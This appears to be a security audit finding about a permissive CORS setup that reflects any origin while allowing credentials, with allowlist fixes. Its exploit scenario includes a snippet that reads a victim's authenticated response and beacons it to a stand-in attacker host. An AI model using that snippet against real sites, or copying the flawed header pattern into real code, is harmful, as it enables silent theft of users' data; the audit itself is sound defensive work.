### CYBER-001: Permissive CORS with Credentials Enables Cross-Origin Data Theft

| Field | Value |
|-------|-------|
| **Rule ID** | CYBER-001 |
| **Severity** | **Critical** |
| **CWE** | CWE-346 (Origin Validation Error) |
| **OWASP** | A01:2021 — Broken Access Control |
| **Confidence** | 95% |

**Description:**

Lines 5–9 implement a manual CORS policy that reflects the requesting origin verbatim into `Access-Control-Allow-Origin` while simultaneously setting `Access-Control-Allow-Credentials: true`.

```typescript
// Line 5-6
res.setHeader("Access-Control-Allow-Origin", req.headers.origin || "*");
res.setHeader("Access-Control-Allow-Credentials", "true");
```

This is a textbook misconfiguration. Any website on the internet can make a credentialed cross-origin request to `/api/data` (line 11), and the browser will allow the attacker's JavaScript to read the response — including `{ secret: "sensitive data" }`.

**Exploit scenario:**

An attacker hosts the following page on `https://evil.example.com`:

```javascript
fetch("https://your-app.com/api/data", { credentials: "include" })
  .then(r => r.json())
  .then(data => {
    // Exfiltrate: data.secret === "sensitive data"
    navigator.sendBeacon("https://evil.example.com/steal", JSON.stringify(data));
  });
```

Because the server reflects `origin: https://evil.example.com` back into `Access-Control-Allow-Origin` and sends `Access-Control-Allow-Credentials: true`, the browser permits the read. Any authenticated user who visits the attacker's page has their data stolen silently.

**Remediation:**

Validate the `Origin` header against an explicit allowlist before reflecting it:

```typescript
import cors from "cors";

const allowedOrigins = ["https://app.example.com", "https://admin.example.com"];

app.use(cors({
  origin: (origin, callback) => {
    if (!origin || allowedOrigins.includes(origin)) {
      callback(null, origin);
    } else {
      callback(new Error("Not allowed by CORS"));
    }
  },
  credentials: true,
}));
```

Alternatively, if the manual approach is preferred, validate before reflecting:

```typescript
const ALLOWED = new Set(["https://app.example.com"]);

app.use((req, res, next) => {
  const origin = req.headers.origin;
  if (origin && ALLOWED.has(origin)) {
    res.setHeader("Access-Control-Allow-Origin", origin);
    res.setHeader("Access-Control-Allow-Credentials", "true");
  }
  // Do NOT fall back to "*" with credentials
  next();
});
```

